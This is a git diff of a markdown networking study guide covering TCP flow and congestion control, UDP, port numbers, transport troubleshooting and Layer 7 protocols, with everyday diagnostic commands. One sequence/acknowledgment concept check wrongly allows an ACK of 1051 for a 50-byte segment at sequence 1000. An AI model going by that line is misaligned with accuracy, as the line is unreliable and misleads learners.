+|--------|------|---------|
+| FIN | Graceful | Normal close; finish buffered data |
+| RST | Abrupt | Error, refuse connection, force kill |
+
+---
+
+##### TCP Flow Control (Sliding Window)
+
+**Problem:** Sender transmits faster than receiver can process - buffer overflow and retransmissions.
+
+**Solution - Sliding Window:**
+Receiver advertises a **window size** = bytes it can currently accept. Sender keeps unacknowledged data within that window.
+
+```
+Sender view:
+[sent + acked] [sent, unacked] [can send now] [cannot send yet]
+               |<---  window  -->|
+```
+
+As the receiver processes data and ACKs arrive, the window slides forward allowing more bytes.
+
+**Window Scaling (RFC 1323):**
+- Base 16-bit field caps at 65,535 bytes
+- Window scale option (negotiated in SYN) multiplies by up to 2^14
+- Essential for high-bandwidth, high-latency links (satellite, transoceanic)
+
+**Flow Control vs Congestion Control (Critical Distinction):**
+- **Flow control (rwnd):** protects receiver buffers.
+- **Congestion control (cwnd):** protects the network path.
+- Sender can transmit up to: `min(rwnd, cwnd)` (minus bytes already in flight).
+
+**Bandwidth-Delay Product (BDP) Sizing:**
+- `BDP = bandwidth * RTT` (in bits).
+- Rule of thumb: effective window should be near BDP for full link utilization.
+- Example: 100 Mbps and RTT 50 ms -> BDP ~5,000,000 bits (~625 KB).
+
+**Zero Window (Attack Surface):**
+- Receiver sets `window=0` => sender must pause completely
+- Attacker can manipulate this to stall connections (Zero Window DoS)
+
+---
+
+##### TCP Congestion Control
+
+**Problem:** Network routers drop packets under load - TCP must detect and reduce send rate.
+
+| Algorithm | Behavior |
+|-----------|---------|
+| **Slow Start** | Begin with cwnd=1 MSS; double every RTT until ssthresh |
+| **Congestion Avoidance** | After ssthresh, increase cwnd by 1 MSS per RTT (linear) |
+| **Fast Retransmit** | 3 duplicate ACKs => retransmit immediately (no timeout wait) |
+| **Fast Recovery** | After fast retransmit: ssthresh = cwnd/2, re-enter avoidance |
+
+**Modern Algorithms:**
+
+| Algorithm | Default For | Characteristic |
+|-----------|------------|----------------|
+| TCP Reno | Classic | Standard congestion avoidance |
+| TCP CUBIC | Linux default | Better for high-speed / high-delay |
+| TCP BBR | Google services | Bottleneck-bandwidth based; lower latency |
+| QUIC (UDP-based) | Chrome / HTTP/3 | Implements own CC at application layer |
+
+**ECN (Explicit Congestion Notification):**
+- Lets routers signal congestion before drops (marks packets instead of dropping first).
+- TCP endpoints use ECE/CWR flags to react to ECN marks.
+- Reduces retransmission cost in some congested environments.
+
+---
+
+##### User Datagram Protocol (UDP)
+
+**Overview:**
+UDP is **connectionless, unreliable, and very fast**. No handshake, no ACK, no retransmission.
+
+**Core Philosophy:**
+- "Straight talk, no nonsense" transport: send now, recover at the application if needed.
+- No session state is established between sender and receiver.
+
+**Why UDP is still useful:**
+- Lower latency than TCP because setup/retransmission logic is skipped.
+- Small fixed header (8 bytes) leaves more room for payload.
+- In real-time traffic (VoIP, live streaming, gaming), stale data is often worse than dropped data.
+
+**UDP Segment Structure (8 bytes total):**
+
+```
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|          Source Port          |       Destination Port        |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|             Length            |            Checksum           |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                          Payload Data                         |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+```
+
+| Field | Size | Description |
+|-------|------|-------------|
+| Source Port | 16 bits | Sender's port (optional; 0 if unused) |
+| Destination Port | 16 bits | Receiver's port |
+| Length | 16 bits | Total datagram length in bytes (header + data); min 8, max 65,535 |
+| Checksum | 16 bits | Error detection (optional in IPv4, mandatory in IPv6) |
+
+**Length and MTU note:**
+- UDP can carry up to 65,535 bytes at the IP level.
+- In practice, path MTU limits payload size (commonly around 1500-byte Ethernet MTU) unless fragmentation is used.
+- For performance-sensitive UDP apps, keep datagrams below path MTU to avoid fragmentation loss amplification.
+
+**Pseudo Header (for checksum calculation):**
+- UDP temporarily uses Source IP, Destination IP, and Protocol from IP to compute checksum.
+- This helps detect misdelivery to the wrong endpoint, not just bit errors in payload.
+
+| Feature | Description |
+|---------|------------|
+| Connection | Connectionless - zero handshake |
+| Reliability | None - no ACK, no retransmission |
+| Ordering | Packets may arrive out of order |
+| Speed | Very fast - minimal header overhead |
+| Header Size | 8 bytes (vs TCP's 20 to 60 bytes) |
+| Flow/Congestion Control | None at UDP layer; handled by app/protocol above UDP |
+| Broadcast/Multicast | Fully supported |
+| Use Cases | DNS, DHCP, VoIP, video streaming, gaming, TFTP, NTP |
+
+**Limitations:**
+- No continuous byte-stream abstraction; applications send discrete datagrams.
+- No built-in recovery for loss/reordering/duplication.
+- Under congestion, UDP datagrams may be dropped; apps must tolerate or recover.
+
+**Key Takeaway:**
+- UDP is like a sports car: lightweight and fast, ideal when latency matters more than perfection.
+- TCP is like an armored truck: heavier and slower, but designed for reliable delivery.
+
+**Concept Check:**
+- For a file transfer app (for example, sending a `.zip`), prefer TCP because losing even 1 byte can corrupt the file.
+
+---
+
+##### TCP vs UDP - Complete Comparison
+
+| Feature | TCP | UDP |
+|---------|-----|-----|
+| Connection model | Connection-oriented | Connectionless |
+| Reliability | Reliable (ACK + retransmit) | Unreliable |
+| Ordering | Guaranteed in-order delivery | Unordered |
+| Speed | Slower | Faster |
+| Header Size | 20 to 60 bytes | 8 bytes |
+| Flow Control | Yes (sliding window) | No |
+| Congestion Control | Yes | No |
+| Broadcast/Multicast | No | Yes |
+| Error Detection | Mandatory checksum | Checksum used for error detection (optional in IPv4, mandatory in IPv6) |
+| Handshake | 3-way SYN handshake | None |
+| Termination | 4-way FIN teardown | None |
+| Applications | HTTP/S, SSH, FTP, email, databases | DNS, VoIP, streaming, gaming, TFTP |
+| Wireshark Filter | `tcp` | `udp` |
+
+**Use TCP when:** Data integrity is critical, ordering matters, or you cannot tolerate loss.
+**Use UDP when:** Speed/latency is critical, or the application provides its own reliability (QUIC).
+
+**Decision Matrix (Quick):**
+
+| Requirement | Better Fit | Why |
+|-------------|------------|-----|
+| Exact, complete file delivery | TCP | Retransmission + ordering guarantee |
+| Real-time voice/video | UDP (or QUIC) | Freshness more important than perfect recovery |
+| Lossy links with app-level reliability | QUIC/UDP-based app | Recovery logic tuned at application level |
+| Simple request/response with tiny payload | UDP (case-dependent) | Lower setup overhead |
+
+**QUIC - The Modern Evolution:**
+- Built by Google; now IETF RFC 9000
+- Runs over **UDP** but implements reliable delivery, ordering, and TLS 1.3
+- Powers **HTTP/3** - the next-generation web protocol
+- 0-RTT or 1-RTT handshake (faster than TCP + TLS)
+- Eliminates head-of-line blocking at the transport layer
+
+**Concept Checks (Video-Aligned)**
+- **UDP file transfer check:** Should `.zip` transfer use UDP or TCP? Use **TCP** because even small loss can corrupt the file.
+- **Handshake math:** If client sends `SYN seq=1000`, server replies with `ACK=1001` in `SYN-ACK`.
+- **Seq/Ack math:** If a segment has `SEQ=1000` and length `50`, expected ACK is `1050` (or `1051` if counting from the next expected byte in one-based teaching examples).
+- **Buffer logic:** Sent-but-unACKed data must remain in sender buffer for potential retransmission.
+- **Error-control behavior:** If segment 2 is dropped and segments 3/4 arrive, receiver keeps sending duplicate ACK requesting segment 2; sender fast-retransmits after 3 duplicate ACKs.
+
+---
+
+##### Port Numbers
+
+**Definition:** A **port** is a 16-bit logical number (0 to 65535) that identifies a specific process/service on a host. Enables **multiplexing** - many simultaneous connections on one IP address.
+
+**Port Ranges:**
+
+| Range | Category | Notes |
+|-------|----------|-------|
+| 0 to 1023 | Well-known (System) | Assigned by IANA; require root/admin to bind |
+| 1024 to 49151 | Registered | Assigned for specific applications |
+| 49152 to 65535 | Dynamic / Ephemeral | Auto-assigned for client connections |
+
+**Critical Ports for Security:**
+
+| Port | Protocol | Service | Security Note |
+|------|----------|---------|--------------|
+| 21 | TCP | FTP | Credentials sent in plaintext |
+| 22 | TCP | SSH | Target for brute-force; keep updated |
+| 23 | TCP | Telnet | Completely unencrypted; do not use |
+| 25 | TCP | SMTP | Abuse for spam via open relays |
+| 53 | TCP/UDP | DNS | DNS tunneling / zone transfer abuse |
+| 80 | TCP | HTTP | Clear-text web; intercept/MITM |
+| 135 to 139 | TCP | NetBIOS | Legacy Windows exploitation |
+| 443 | TCP | HTTPS | TLS; verify certificate validity |
+| 445 | TCP | SMB | EternalBlue, WannaCry, lateral movement |
+| 3306 | TCP | MySQL | DB exposed to internet - disaster |
+| 3389 | TCP | RDP | BlueKeep, brute force, credential spray |
+| 5432 | TCP | PostgreSQL | Often misconfigured and exposed |
+| 6379 | TCP | Redis | Frequently deployed unauthenticated |
+| 27017 | TCP | MongoDB | Often world-readable by default |
+
+**Socket Address:**
+A **socket** uniquely identifies a connection endpoint: `IP_Address:Port`
+
+A TCP connection is uniquely identified by the **5-tuple:**
+```
+( Protocol, Source IP, Source Port, Destination IP, Destination Port )
+```
+
+Two clients connecting from different ephemeral ports to the same server port = two distinct connections.
+
+**NAT and Ephemeral Ports (Operations):**
+- Client-side ephemeral ports are usually NAT-translated at edge devices.
+- Large-scale systems can hit **ephemeral port exhaustion** under high short-lived connection churn.
+- Reuse, keep-alive strategy, and proper timeout tuning help reduce pressure.
+
+##### Transport Layer Troubleshooting (Practical)
+
+**Fast Diagnosis Workflow:**
+1. Confirm listener and socket state (`LISTEN`, `ESTABLISHED`, `CLOSE_WAIT`, `TIME_WAIT`).
+2. Check handshake success/failure patterns (SYN, SYN-ACK, ACK).
+3. Verify retransmissions, duplicate ACKs, and window behavior.
+4. Check MTU/MSS mismatches and fragmentation symptoms.
+5. Correlate with firewall/NAT timeout behavior.
+
+**Useful Linux Commands:**
+
+```bash
+# Socket state and listening services
+ss -tuln
+
+# Active TCP connections with timers/state
+ss -tanp
+
+# Retransmission and stack counters
+netstat -s | grep -Ei 'retrans|listen|drops|reset'
+
+# Quick capture for a single service
+sudo tcpdump -i any -nn 'tcp port 443'
+
+# UDP traffic check (example DNS)
+sudo tcpdump -i any -nn 'udp port 53'
+```
+
+**High-Signal Wireshark Filters:**
+- `tcp.flags.syn == 1 && tcp.flags.ack == 0` -> new connection attempts
+- `tcp.analysis.retransmission` -> retransmitted segments
+- `tcp.analysis.duplicate_ack` -> duplicate ACK patterns
+- `tcp.window_size_value == 0` -> zero-window events
+- `udp && ip.frag_offset > 0` -> fragmented UDP behavior
+
+**Common Symptoms -> Likely Causes:**
+
+| Symptom | Likely Cause | First Check |
+|---------|--------------|-------------|
+| Many `SYN_SENT` connections | Upstream filtering/server unreachable | Firewall ACLs, route reachability |
+| Many `SYN_RECV` entries | SYN flood / incomplete handshakes | SYN cookies, backlog, source rate |
+| Repeated retransmissions | Loss/congestion/MTU issue | RTT/loss, PMTUD, interface errors |
+| Excessive `CLOSE_WAIT` | App not closing sockets | Application connection lifecycle |
+| UDP intermittent drop spikes | Congestion or oversized datagrams | Queue drops, MTU-safe payload size |
 
 ---
 
@@ -5041,171 +4981,172 @@ Public-Key-Pins: pin-sha256="base64hash"; max-age=5184000
 
 #### 9.3.7 **Layer 7: Application Layer**
 
-**Primary Function:** Interface between user applications and network
+**Primary Function:** Provide network services and protocol rules that applications use to exchange data.
 
 **Position & Role**
-- Top of OSI (Layer 7) / Application layer in TCP/IP.
-- Sits directly above Transport.
-- Provides network services to end‑user applications.
+- Highest OSI layer (L7), directly above Transport (L4).
+- In TCP/IP, OSI L5 + L6 + L7 are commonly combined into one Application layer.
+- Defines request/response behavior, data semantics, authentication methods, and service-specific errors.
 
 **User Application vs Application Layer**
-- **User app:** Chrome, Outlook, Discord (the software you use).
-- **Application layer:** Protocols and rules the app uses (HTTP, SMTP, FTP).
+- **User application:** Browser, mail client, chat client, SIEM UI.
+- **Application layer:** HTTP, DNS, SMTP, IMAP, SSH, SNMP, NTP protocol behavior used by those apps.
 
-**Responsibilities:**
-- Provide network services directly to end-user applications
-- Enable software applications to communicate over network
-- Handle high-level protocols and data representation
-- User authentication and privacy
+**What Layer 7 Actually Controls**
+- Resource naming (domains, URIs, mailbox identifiers, API paths).
+- Message semantics (methods, commands, status codes, error classes).
+- Serialization and format choices (JSON, XML, MIME, protobuf).
+- Session logic (tokens, cookies, auth headers, renewals).
+- Service policy (rate limits, access control, retries, cache behavior).
 
-**Not the Application Itself:**
-- OSI Layer 7 is NOT the application (e.g., web browser)
-- It's the protocols and services the application uses
+##### **Core Concepts You Must Remember**
 
-**Key Services Provided**
-- **Web:** HTTP/HTTPS
-- **File Transfer:** FTP/SFTP/FTAM
-- **Email:** SMTP/POP3/IMAP
-- **Remote Login:** SSH/Telnet
-- **Directory/Name Services:** DNS
-- **Network Management:** SNMP
+**1) Service Access = IP + Port + Protocol Rules**
+- Transport gets packets to a socket.
+- Application protocol tells both sides what each byte means.
+- Same port can expose different behavior depending on protocol version/features.
 
-##### **Deep Expansion: Session, Presentation & Application**
+**2) Layer 7 Is State-Aware Even If Transport Is Reliable**
+- TCP reliability does not prevent logical failures (invalid token, expired session, bad API version).
+- App state errors are visible as protocol-level responses (HTTP 401/403/429/500, SMTP 550, DNS SERVFAIL).
 
-##### **DNS Protocol & Security**
+**3) Security Is Mostly Application-Driven**
+- TLS deployment, certificate validation, auth model, input validation, and session hardening all happen at/above L7.
 
-> 📖 *For comprehensive DNS coverage including resolution process, record types, hierarchy, tools, and red team applications, see [Section 19. Domain Name System (DNS)](#19-domain-name-system-dns--the-internets-phonebook).*
+##### **Common Application Protocols (Quick Map)**
 
-- **Record Types:** A, AAAA, MX, CNAME, NS, SOA, TXT, SPF, DKIM, SRV, CAA.
-- **Resolution Process:** Recursive vs iterative queries, caching behavior, TTL impact.
-- **DNSSEC:** Adds authenticity and integrity, not confidentiality.
-- **DoH/DoT:** Encrypt DNS queries; improves privacy but complicates monitoring.
-- **Security Risks (Conceptual):** Cache poisoning, amplification, and exfiltration via query channels.
-- **Operational Hygiene:** Split‑horizon DNS, restricted zone transfers, and query logging reduce exposure.
-- **TTL Strategy:** Short TTLs aid rapid changes; long TTLs reduce resolver load and stabilize responses.
-- **Negative Caching:** NXDOMAIN responses can be cached, affecting troubleshooting and rollout timing.
-- **Transport Behavior:** UDP is default; TCP is used for large responses, zone transfers, and DNSSEC.
+| Service | Common Ports | Typical Transport | Main Use | Security Notes |
+|---|---:|---|---|---|
+| DNS | 53 | UDP/TCP | Name resolution | Use DNSSEC validation where possible; restrict zone transfer |
+| HTTP | 80 | TCP | Web/API cleartext | Redirect to HTTPS, avoid plaintext credentials |
+| HTTPS | 443 | TCP | Encrypted web/API | Enforce modern TLS and strong cert validation |
+| QUIC / HTTP/3 | 443 | UDP | Low-latency web | Monitor separately from TCP flows |
+| SMTP | 25, 587, 465 | TCP | Mail submission/relay | SPF/DKIM/DMARC, STARTTLS or SMTPS |
+| IMAP | 143, 993 | TCP | Mail retrieval/sync | Prefer 993 (IMAPS), disable weak auth |
+| POP3 | 110, 995 | TCP | Mail download | Prefer 995 (POP3S) |
+| FTP | 21 (+data ports) | TCP | Legacy file transfer | Cleartext by default; prefer SFTP/FTPS |
+| SFTP | 22 | TCP | Secure file transfer | SSH key auth and strict host key checking |
+| SSH | 22 | TCP | Secure remote administration | Disable password auth where possible |
+| Telnet | 23 | TCP | Legacy remote terminal | Insecure, avoid in production |
+| SNMP | 161/162 | UDP | Monitoring/management | Use SNMPv3, restrict manager IPs |
+| NTP | 123 | UDP | Time synchronization | Use authenticated/time-hardened sources |
+| LDAP / LDAPS | 389 / 636 | TCP | Directory/auth queries | Prefer LDAPS or StartTLS |
+| RADIUS | 1812/1813 | UDP | AAA for access control | Protect shared secrets, segment management plane |
 
-##### **DHCP Protocol**
+##### **Protocol Deep Dive (Exam + Practical View)**
 
-> 📖 *For detailed DHCP coverage including assignment methods and security considerations, see [Section 18.7 IP Address Assignment Methods](#187-ip-address-assignment-methods).*
+##### **DNS (Name Resolution Backbone)**
 
-- **Lease Cycle:** Discover, Offer, Request, ACK.
-- **Options:** Default gateway, DNS servers, domain suffix, lease duration.
-- **Relay Agents:** Forward DHCP across subnets.
-- **Security Risks (Conceptual):** Rogue DHCP servers and starvation attacks; DHCP snooping mitigates.
-- **Lease Strategy:** Short leases support mobility; longer leases reduce churn and DHCP overhead.
-- **Timers (T1/T2):** Renew and rebind intervals define client behavior before lease expiry.
-- **Option 82 (Relay Info):** Adds circuit/location metadata for policy and auditing.
+Reference: See [Section 19. Domain Name System (DNS)](#19-domain-name-system-dns--the-internets-phonebook).
 
-##### **NTP**
+- **Record types:** A, AAAA, CNAME, MX, NS, SOA, TXT, PTR, SRV, CAA.
+- **Query model:** Stub resolver -> recursive resolver -> authoritative servers.
+- **Caching:** TTL controls cache duration; negative caching affects NXDOMAIN behavior.
+- **Transport:** UDP normally; TCP for large responses, DNSSEC, and zone transfers.
+- **Security concepts:** Cache poisoning, amplification abuse, data exfiltration through subdomains.
 
-- **Stratum Levels:** Define distance from a time source.
-- **Authentication:** Prevents time manipulation which can disrupt logging and authentication.
+Linux checks:
+```bash
+dig A example.com +short
+dig MX example.com +short
+dig @1.1.1.1 example.com +dnssec
+dig AXFR example.com @ns1.example.com
+```
 
-##### **SNMP**
+##### **HTTP/HTTPS (Web and API Plane)**
 
-- **Manager/Agent Model:** Agents expose MIBs; managers query OIDs.
-- **Versions:** v1/v2c use community strings; v3 adds authentication and encryption.
-- **Access Control:** Restrict SNMP to management networks and avoid write access where possible.
-- **Views:** Limit exposed OIDs to reduce information disclosure.
+- **Methods:** GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS.
+- **Status families:** 2xx success, 3xx redirect, 4xx client-side issue, 5xx server-side issue.
+- **State controls:** Cookies, session IDs, bearer tokens, CSRF protections.
+- **Performance:** HTTP/2 multiplexing, HTTP/3 over QUIC, CDN/reverse proxy caching.
+- **Security:** HSTS, secure cookie flags, strict TLS validation, origin/header controls.
 
-##### **Syslog**
+Linux checks:
+```bash
+curl -I https://example.com
+curl -k -v https://example.com/login
+curl --http3 -I https://example.com
+openssl s_client -connect example.com:443 -servername example.com </dev/null
+```
 
-- **Facilities & Severity:** Categorize logs for centralized analysis.
-- **Security Use:** Correlation and incident response depend on reliable logging.
-- **Time Sync:** Accurate timestamps rely on consistent NTP across devices.
-- **Transport:** UDP is common but lossy; TCP/TLS syslog provides reliability and confidentiality.
+##### **Email Stack (SMTP + IMAP/POP3)**
 
-##### **File Transfer Protocols**
+- **SMTP:** Transfer and submission (25 relay, 587 submission, 465 implicit TLS).
+- **IMAP:** Server-side mailbox sync; best for multi-device use.
+- **POP3:** Download-centric access, commonly less flexible for sync.
+- **Mail trust controls:** SPF (sender policy), DKIM (message signature), DMARC (policy/alignment).
 
-- **FTP:** Clear‑text control and data channels.
-- **TFTP:** Minimal and unauthenticated, used for device bootstrapping.
-- **SFTP/SCP:** Secure alternatives over SSH.
+Linux checks:
+```bash
+dig TXT example.com +short
+dig TXT _dmarc.example.com +short
+openssl s_client -starttls smtp -connect mail.example.com:587
+```
 
-##### **QoS Fundamentals**
+##### **Remote Access and File Services**
 
-> 📝 *Quick reference for QoS concepts. See Layer 2 sections for related CoS/DSCP tagging.*
+- **SSH:** Encrypted administration, tunneling, key-based authentication.
+- **SFTP/SCP:** Secure file movement over SSH.
+- **FTP/TFTP:** Legacy workflows; FTP is cleartext, TFTP has minimal controls.
+- **Operational rule:** If protocol cannot provide confidentiality + integrity + strong auth, isolate or retire it.
 
-- **Classification & Marking:** DSCP and CoS identify traffic priorities.
-- **Queueing Models:** FIFO, WFQ, CBWFQ, LLQ.
-- **Policing vs Shaping:** Immediate drops vs buffering to smooth bursts.
-- **PHB:** Per‑hop behavior defines how routers treat traffic.
-- **Trust Boundaries:** Classify and mark traffic at network edges to prevent endpoint remarking.
-- **Congestion Management:** Queue selection and buffer sizing influence latency, jitter, and loss.
+Linux checks:
+```bash
+ssh -v user@host
+sftp user@host
+nc -vz host 21 22 23 80 443
+```
 
-##### **Authentication & Identity**
+##### **Management Plane Protocols (SNMP, Syslog, NTP)**
 
-- **Kerberos:** Ticket‑based authentication (TGT/TGS).
-- **LDAP:** Directory queries and user authentication.
-- **RADIUS:** Centralized AAA with shared secrets.
-- **TACACS+:** Cisco AAA with full packet encryption.
-- **OAuth 2.0 / SAML:** Federated identity and token‑based access.
-- **NTLM:** Challenge‑response legacy mechanism.
+- **SNMP:** Use v3 (auth + privacy), avoid default communities, restrict to management VLAN.
+- **Syslog:** Prefer TCP/TLS for reliability and confidentiality in transit.
+- **NTP:** Accurate time is mandatory for SIEM correlation, Kerberos validity, and forensic timelines.
 
-##### **TLS & Web Security**
+Linux checks:
+```bash
+timedatectl status
+chronyc sources -v
+snmpwalk -v3 -l authPriv -u monitor -a SHA -A 'authpass' -x AES -X 'privpass' 10.0.0.10 1.3.6.1.2.1.1
+```
 
-- **TLS Handshake:** ClientHello, ServerHello, key exchange, finished.
-- **Certificate Chain:** Root → intermediate → end‑entity; trust validation is critical.
-- **Cipher Suites:** Define key exchange, encryption, and hashing algorithms.
-- **HSTS & Pinning:** Strengthen HTTPS by enforcing strict transport.
-- **Vulnerability Awareness (Conceptual):** Heartbleed, POODLE, BEAST, CRIME.
-- **Certificate Hygiene:** Rotation, revocation (CRL/OCSP), and key management preserve trust.
-- **SNI/ALPN:** Enables virtual hosting and protocol negotiation (e.g., HTTP/2) over TLS.
-- **PFS (Perfect Forward Secrecy):** Ephemeral keys prevent historical decryption if long‑term keys leak.
-- **Session Resumption:** Reduces handshake latency while preserving security properties.
+##### **Security Threats at Application Layer (High Yield)**
 
-##### **HTTP & Web Architecture**
+- Broken authentication and session management.
+- Injection families (SQL/command/template/deserialization).
+- SSRF, XXE, insecure redirects, IDOR, and access-control bypass.
+- Weak TLS/cert validation or trust-on-first-use misuse.
+- Protocol abuse (DNS tunneling, SMTP spoofing, HTTP smuggling, API rate-limit bypass).
 
-> 📖 *For detailed HTTP coverage including connection types, message format, caching, and FTP/Email protocols, see the [World Wide Web (WWW) & HTTP](#world-wide-web-www--http) section below.*
+##### **Blue Team Hardening Checklist (L7-Focused)**
 
-- **Methods:** GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD.
-- **Headers:** Host, Authorization, Cookie, User‑Agent, X‑Forwarded‑For.
-- **Status Codes:** 2xx, 3xx, 4xx, 5xx categories.
-- **HTTP/2 & HTTP/3:** Multiplexing and QUIC‑based transport for lower latency.
-- **Caching Layers:** CDNs and reverse proxies reduce latency but must be controlled by cache headers.
-- **State Management:** Sessions, cookies, and tokens must be scoped and protected appropriately.
-- **Idempotency:** Methods like GET/PUT should be safe to retry; POST may not be.
-- **Cookie Flags:** Secure, HttpOnly, and SameSite reduce exposure to interception and CSRF.
+- Enforce TLS 1.2+ (prefer TLS 1.3), disable legacy ciphers/protocols.
+- Standardize auth: MFA for users, short-lived tokens for services, key rotation.
+- Implement strict input validation and output encoding at every trust boundary.
+- Deploy WAF/API gateway rules with baseline and anomaly policies.
+- Log and alert on auth failures, privilege changes, unusual request patterns, and DNS anomalies.
+- Protect management interfaces behind segmentation and allowlists.
+- Use least privilege for service accounts and separate admin/user planes.
 
-##### **Session & Application Security (Conceptual)**
+##### **Practical Troubleshooting Workflow (Fast Triage)**
 
-- Session hijacking/fixation, CSRF, SSRF, XXE, injection, and unsafe deserialization are common risk categories in web applications.
+1. Resolve name: `dig` or `nslookup`.
+2. Check reachability and port: `nc -vz host port`.
+3. Validate TLS/cert chain: `openssl s_client`.
+4. Send protocol-native request: `curl`, `smtp` test, `ssh -v`.
+5. Capture and inspect: `tcpdump`/Wireshark filters.
+6. Correlate with server/app logs for exact failure reason.
 
-##### **VPN & Tunneling**
+Useful packet captures:
+```bash
+sudo tcpdump -ni any port 53
+sudo tcpdump -ni any 'tcp port 80 or tcp port 443'
+sudo tcpdump -ni any udp port 123
+```
 
-> 📖 *For detailed VPN and tunneling coverage, see [Section 17.3 Firewall Architectures](#173-firewall-architectures) and VPN-related subsections.*
+##### **Exam/Interview One-Liner**
 
-- **IPsec:** AH/ESP, transport vs tunnel modes.
-- **GRE:** Simple encapsulation without encryption.
-- **OpenVPN/WireGuard:** Modern VPN protocols with different performance and trust models.
-- **Leak Risks (Conceptual):** DNS leaks, IPv6 leaks, and split‑tunnel exposure.
-
-##### **Network Device Management**
-
-- **Console Access:** Out‑of‑band management channel.
-- **Telnet vs SSH:** Encrypted vs clear‑text administrative access.
-- **HTTP/HTTPS Management:** Web GUIs require proper certificate handling.
-- **AAA:** TACACS+ and RADIUS for centralized control.
-- **Privilege Levels:** Role separation and session timeouts.
-
-##### **Wireless LAN Configuration Concepts**
-
-- **WLAN Creation:** SSID profiles and service sets.
-- **Security:** WPA2‑PSK vs WPA2‑Enterprise vs WPA3.
-- **QoS Profiles:** Voice/video/best‑effort differentiation.
-- **VLAN Assignment:** WLAN‑to‑VLAN mapping for segmentation.
-- **FlexConnect:** Branch traffic handling with central policy.
-
-##### **Monitoring & Analysis**
-
-- **Packet Capture:** Full visibility of payloads and headers.
-- **Flow Telemetry:** Summarized traffic metadata for scale.
-- **Proxy Monitoring:** Visibility and policy enforcement.
-- **IDS/IPS:** Signature and behavior‑based detection.
-- **SIEM:** Centralized correlation and alerting.
-- **Baselining:** Establishing normal traffic patterns is essential for anomaly detection.
-- **Retention:** Log retention policies balance forensic value with storage cost.
+Layer 7 is where business logic meets network communication: it defines how applications name resources, authenticate users/services, exchange structured data, and enforce security policy on top of transport connectivity.
 
 **Network Architectures**
 
@@ -5669,7 +5610,7 @@ Application Layer: Alice composes email in client
                   ↓
 Email client uses SMTP protocol
                   ↓
-Transport Layer: TCP segments data, port 25
+Transport Layer: TCP segments data, typically port 587 (submission) or 25 (server relay)
                   ↓
 Network Layer: IP packets with dest IP of mail server
                   ↓
@@ -5899,479 +5840,18 @@ The Application Layer provides network services directly to user applications. I
 
 ### 11.4 Transport Layer (Layer 4 / Layer 3 in 4-layer)
 
-The Transport Layer is responsible for **end-to-end communication** between processes on two hosts. It provides reliable (TCP) or best-effort (UDP) delivery, port addressing, and multiplexing of multiple connections on a single IP.
+This section is intentionally condensed to avoid duplication.
 
----
+Transport fundamentals are covered in detail in **Section 9.3.4 Layer 4: Transport Layer**, including:
+- TCP behavior, header structure, flags, handshake, teardown, flow/congestion control.
+- UDP behavior, header format, MTU considerations, and common use cases.
+- TCP vs UDP comparison, ports, and practical troubleshooting commands.
 
-#### 11.4.1 Transmission Control Protocol (TCP)
+Quick recap:
+- **TCP:** reliable, connection-oriented, ordered delivery.
+- **UDP:** connectionless, low-overhead, best-effort delivery.
+- **Transport role:** process-to-process communication via ports with multiplexing/demultiplexing.
 
-**Overview:**
-TCP is a **connection-oriented, reliable, ordered, error-checked** transport protocol. It guarantees that all data arrives completely, in order, and without corruption.
-
-| Feature | TCP Behavior |
-|---------|-------------|
-| Connection | Requires handshake (connection-oriented) |
-| Reliability | ACKs every segment; retransmits lost ones |
-| Ordering | Sequence numbers guarantee in-order delivery |
-| Error Checking | Checksum covers header and data |
-| Flow Control | Sliding window prevents receiver overflow |
-| Congestion Control | Reduces send rate under network congestion |
-| Header Overhead | Higher — 20 to 60 bytes per segment |
-| Use Cases | HTTP/S, SSH, FTP, SMTP, databases |
-
----
-
-#### 11.4.2 TCP Segment Structure
-
-A TCP segment: **header** (minimum 20 bytes) + **data payload**.
-
-```
- 0                   1                   2                   3
- 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|          Source Port          |       Destination Port        |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                        Sequence Number                        |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                    Acknowledgment Number                      |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|  Data |       |U|A|P|R|S|F|                                   |
-| Offset|  Res. |R|C|S|S|Y|I|            Window Size            |
-|       |       |G|K|H|T|N|N|                                   |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|           Checksum            |         Urgent Pointer        |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                    Options (if Data Offset > 5)               |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                          Payload Data                         |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-```
-
-**Field Reference:**
-
-| Field | Size | Description |
-|-------|------|-------------|
-| Source Port | 16 bits | Sender's port (1 to 65535) |
-| Destination Port | 16 bits | Receiver's port |
-| Sequence Number | 32 bits | Position of first byte in this segment |
-| Acknowledgment Number | 32 bits | Next expected byte from the remote side |
-| Data Offset | 4 bits | Header length in 32-bit words (min 5 = 20 bytes) |
-| Reserved | 6 bits | Must be zero |
-| Control Flags | 6 bits | URG, ACK, PSH, RST, SYN, FIN |
-| Window Size | 16 bits | Receiver buffer available (flow control) |
-| Checksum | 16 bits | Error detection over header + data |
-| Urgent Pointer | 16 bits | Offset to urgent data (URG flag must be set) |
